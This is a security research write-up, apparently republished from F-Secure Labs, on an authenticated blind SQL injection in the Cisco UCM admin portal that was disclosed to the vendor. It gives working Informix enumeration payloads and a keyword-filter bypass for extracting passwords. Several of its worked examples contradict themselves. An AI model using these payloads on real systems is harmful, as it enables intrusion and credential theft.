---
layout: page
title: Uncommon SQL Database Alert - Informix SQL Injection
permalink: /published-research/informix-sql-injection
---

#### Original post: [https://labs.f-secure.com/blog/uncommon-sql-database-alert-informix-sql-injection/](https://labs.f-secure.com/blog/uncommon-sql-database-alert-informix-sql-injection/)

## Intro

A client was looking to upgrade their Cisco UCM software and wanted assurance that their implementation was configured securely. During the assessment, we had discovered an authenticated SQL Injection issue within the Cisco UCM administrator portal. In most cases, this discovery can be followed up with using SQLMap or other tools to automatically exploit the issue.

Seeing as we were testing within the client's development environment, we were given permission to perform more aggressive attacks against Cisco UCM. The SQLMap command I originally used was the following:

```
root@kali~# sqlmap --level=5 --risk=3 -r request.txt
```

The request file contained something the following:

```
GET /ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1*&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true HTTP/1.1
Host: <cucm_admin_portal>
Cookies: JSESSIONID=<jsessionid_data>; com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY=<cisco_data>; JSESSIONIDSSO=<jsessionidsso_data>
Accept: text/html
Connection: close  
```

After letting SQLMap do what it does, a database was identified: Informix SQL. Additionally, the method of injection was Blind Boolean. From there, SQLMap can usually be used to enumerate the underlying database and potentially gain access to passwords and sensitive data. However, after using SQLMap to perform those tasks, some issues became apparent:

* SQLMap was able to enumerate the name of the current table, but was unable to enumerate other database names and other table names
* SQLMap was able to enumerate the current SQL user name but was also reporting over 1000 users for the underlying database and could not enumerate the other 999 users
* SQLMap was unable to enumerate any information relating to any user's password within the `applicationuser` table

The following sections will be used to demonstrate how the root cause of each issue above were identified and how these issues were overcame.

## Crash Course in Informix

Before continuing, some research was put into learning about Informix SQL.

The following is a quick lesson on the `systables` table:

* Informix keeps a record of all table information within the table `systables`
* The different columns within `systables` represent different information, such as the column `tabname` represents a specific table's name and the column `tabid` represents a specific table's ID number
* Other information can include the column `ncols` which is the number of columns in the table, and the column `nrows` which is the number of rows in the table

So as an example, let's assume that a table was named `yaytableyay`. To retrieve the `tabid` number, the following query could be used:

```
SELECT tabid FROM systables WHERE tabname = 'yaytableyay'
#Returned 54
```

To take it further, if we wanted to find the number of rows within the `yaytableyay` table, we could make the following query:

```
SELECT nrows FROM systables WHERE tabid = 54
#Returned 15
```

The following is a quick lesson on the `syscolumns` table:

* Informix keeps a record of all column information within each table
* The different columns within `syscolumns` represent different information, such as the column `colname` represents the specific column's name and the column `tabid` represents which table the column is assigned to
* Other information can include the column `colno` which is the system sequentially assigned value from left to right

So as an example, if we wanted to find out the name of the first column within the table `yaytableyay`:

```
SELECT colname FROM syscolumns WHERE tabid = 54 AND colno = 1
#returned "yaycolumnnameyay"
```

Additionally, every table has a hidden column called `rowid`. This value is assigned to each row in a table, but is not deleted when a row is deleted. For example, the following query could return no data due to the row being previously deleted:

```
SELECT * FROM yaytableyay WHERE rowid = 1337
#Returned 0 results
```

There is also a chance that a row never even existed. This will still force the database to return the same "0 results" as if the row was deleted. So when using a `rowid` as a `WHERE` clause, there is no way to differentiate between a row that was deleted and a row that never existed.

## Enumerating Other Table Names

One of the best things you can do to troubleshoot any SQLMap issue (or any tool for web application testing) is to proxy the traffic from the tool. In this case, proxying SQLMap through BurpSuite helped identify that whenever SQLMap was instructed to enumerate other table names and database names, the server would always respond with one of the following errors:

* ERROR: A subquery has returned not exactly one row.
* ERROR: "NVL" cannot be used in a query
* ERROR: "RTRIM" cannot be used in a query
* ERROR: "LIMIT" cannot be used in a query
* ERROR: "LENGTH" cannot be used in a query

The first error "not exactly one row" was Googleable and could be linked back to Informix. The other errors appeared to be generic restrictions that were built into Cisco UCM itself. With those error messages in mind, it would appear that a custom script and/or tool would be required to further exploit this issue.

In order to enumerate each table, a work flow was established:

* Figure out how many valid tables were stored within the database
* Enumerate each table name letter by letter
* Enumerate how many rows and columns were in each table

To figure out how many valid tables existed, we used the `tabid` value. Specifically, we performed some "greater than" and "less than" operations based on the following payload:

```
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 1) > 1
```

The above payload would force the server to return the ASCII value for the first letter of each table name if their `tabid` value was more than 1. This of course returned multiple results since there is surely more than 1 table which forced the server to respond with another "Result is more than 1 column" error. However this was expected because the idea that *something* returned means that *something* exists. To illustrate this point further, take the following payload:

```
1=1 AND (SELECT ascii(substring(tabname for 1 from 1)) FROM systables WHERE tabid > 100) > 1
```

Now we are looking for tables whose tabid value is greater than 100. If a table does not exist because a tabid value over 100 does not exist, then the server will respond with no data.

So based on this behavior, we can enumerate how many tables are in the underlying database:

```
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 1) > 1
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 100) > 1 
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 50) > 1 
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 75) > 1 
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 65) > 1 
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid > 74) > 1 
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 75) > 1 
#returned no data
```

We have now established that the number of tabids within the current database is 75.

Next, establishing table names was required. Utilizing the ASCII value function was still an option, so we used similar logic that was used to establish the number of tables. The following payload would determine if the ASCII value of the first letter of the first table name was greater than 64:

```
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 64
```

From this behavior, we can enumerate what the first letter is:

```
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 64
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 96
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 112
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 104
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 100
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 102
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) = 101
#returned some data
```

Based on the above, the first letter of the first table must be an ASCII value of 101, or "e".

Moving onto the next character in the table name, we would replace:

```
tabname from 1 for 1
```

With:

```
tabname from 2 for 1
```

From this point, we can enumerate what the second letter is:

```
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 64
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 96
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 112
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 104
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 108
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 110
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) > 109
#returned some data
```

Based on the above, the ASCII value of the first letter of the first table must be 110, or "m".

For the sake of this blog post, the table that was enumerated in the above example is "empire". The rest of the table names could be enumerated using this method.

After enumerating a table name and associating it with a tabid value, we can start to build some column information.

The following query could be used to help figure out how many columns are in the table "empire":

```
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 1
#returned no data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 2
#returned no data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 3
#returned no data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 4
#returned some data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 5
#returned no data
```

The following query could be used to help figure out the name of the first column within the "empire" table:

```
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) > 64
#returned some data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) > 96
#returned no data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) > 80
#returned no data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) > 72
#returned some data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) > 76
#returned no data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) > 74
#returned some data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) = 73
#returned some data
```

## Enumerating Other SQL Users

When SQLMap was trying to enumerate the other SQL users, the table `sysusers` was used. And similar to the "enumerating other tables" section of this write up, the server would continue to respond with errors when SQLMap tried to enumerate other users.

In the previous section, we covered how to use the `tabid` column as a sequential number system that could be used to enumerate tables. After looking up how the `sysusers` table is organized, it was found that there was no viable sequential number system. As per IBM's official documentation, the following columns make up the `sysusers` table:

* username
* usertype
* priority
* password
* defrole

It was at this point that we used the hidden column `rowid` as part of the `WHERE` portion of our SQL query. The following example query could be used in enumerating the ASCII value of the first letter of the first username where the `rowid` was 1:

```
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 1) > 1
#returned data
```

After enumerating the first username, we can proceed to enumerate the other usernames based on the `rowid` value:

```
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 2) > 1
#returned data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 3) > 1
#returned data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 4) > 1
#returned data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5) > 1
#returned data
```

It gets interesting when the `rowid` value reaches reaches the 5000s:

```
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5000) > 1
#returned no data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5001) > 1
#returned no data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5002) > 1
#returned some data
```

To help resolve this, the `nrows` column in the `systables` table could be used to help establish when we have found a valid user. This is because the `nrows` value is determined based on the number of non-empty rows in a table.

The following query could help determine the number of rows in the `sysusers` table:

```
1=1 AND (SELECT nrows FROM systables WHERE tabname = 'sysusers') > 1
#returned some data
```

Using this query, we can determine that the number of rows with data in the `sysusers` table was 1000:

```
1=1 AND (SELECT nrows FROM systables WHERE tabname = 'sysusers') = 1000
#returned data
```

With this in mind, we can start using `rowid` and `ncols` to enumerate all the usernames within the `sysusers` table. By incrementing the `rowid`, we can cycle through queries and every time a query returns data, we reduce the `ncols` value by 1:

```
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5000) > 1
#returned no data, ncols value is at 444
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5001) > 1
#returned no data, ncols value is at 444
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5002) > 1
#returned data, ncols value is at 443
...
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 7850) > 1
#returned data, ncols value is at 2
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 7851) > 1
#returned data, ncols value is at 1
```

With a set of known rowids with non-empty rows, we can now start to enumerate usernames without having to run any custom scripts indefinitely:

```
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 7851) > 1
#returned data
```

## Enumerating User Passwords

As previously stated, the `sysusers` table contained a row called `password`. It was also found that the Cisco UCM software utilized the table `applicationuser` to store users related to the Cisco UCM software, which also contained a "password row".

Using the previously discussed techniques, it should have been possible to enumerate the entire `app_users` table…that is, until the following query:

```
1=1 AND (SELECT ascii(substring(password from 1 for 1)) FROM applicationuser WHERE rowid = 500) > 1
#returned error "Security Exception"
```

That is a weird error message, and not very Googleable. After some testing, it was determined that the server would only respond with that error when trying to enumerate the `password` column in any table. Based on this behavior, we had assumed that it was a blacklist keyword situation at the application level.

And we were right! All I had to do was URL encode `password` to get past this issue:

```
1=1 AND (SELECT ascii(substring(%70%61%73%73%77%6f%72%64 from 1 for 1)) FROM app_users WHERE rowid = 500) > 1
#returned data
```

## Custom Scripts

SQL Map could not be used to exploit this issue, so F-Secure resorted to creating two scripts to fully exploit this issue. Since this issue requires authenticated access to the Cisco UCM administrative console, both scripts require the user to submit their session cookies.

* `sql_injection_enumerate_tables.py` - enumerates the name of each table on the database and stores them in a file called `cisco_tables.txt`
* `sql_injection_extract_table.py` - reads the entries in `cisco_tables.txt` and enumerates the contents of each table entry

Both scripts don't automatically URL encode specific words that would trigger a security alert, such as `password`. It is recommended that the scripts are proxied through BurpSuite or some other proxy tool that URL encodes words that might trigger security alerts.

## Vendor Patching

The techniques described in this blog post were used to enumerate the entire database of Cisco UCM version 11.5.1.14900-11. Cisco was informed of this issue and patches are currently in development. A joint disclosure date was agreed upon for 20 November 2019.

## Links and References

* F-Secure's official advisory for this issue that affects certain installations of Cisco UCM can be found here: [https://labs.f-secure.com/advisories/cisco-ucm-informix-sql-injection](https://labs.f-secure.com/advisories/cisco-ucm-informix-sql-injection)
	* Backup advisory: [https://yogehi.github.io/cves/cve-2019-15972.html](/cves/cve-2019-15972.html)
* Scripts that were developed to fully exploit this issue can be found here: [https://github.com/Yogehi/Cisco-UCM-SQLi-Scripts](https://github.com/Yogehi/Cisco-UCM-SQLi-Scripts)